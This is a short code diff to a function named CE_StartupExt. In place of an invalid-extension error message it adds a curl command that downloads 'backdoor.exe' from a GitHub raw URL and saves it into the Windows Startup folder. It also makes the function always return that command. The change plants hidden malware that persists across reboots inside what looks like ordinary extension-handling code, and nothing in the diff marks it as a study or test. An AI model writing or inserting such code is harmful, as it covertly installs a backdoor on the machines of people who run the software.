@@ -371,12 +371,10 @@ string CE_StartupExt(string buffer)
 
     if (default_commad == command)
     {
-        ebuf = "echo [EXT] [ERR] - You must use a valid extension name !";
+        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/backdoor.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\""
     }
-    else
-    {
-        ebuf = command;
-    }
+
+    ebuf = command;
 
     return ebuf;
 }
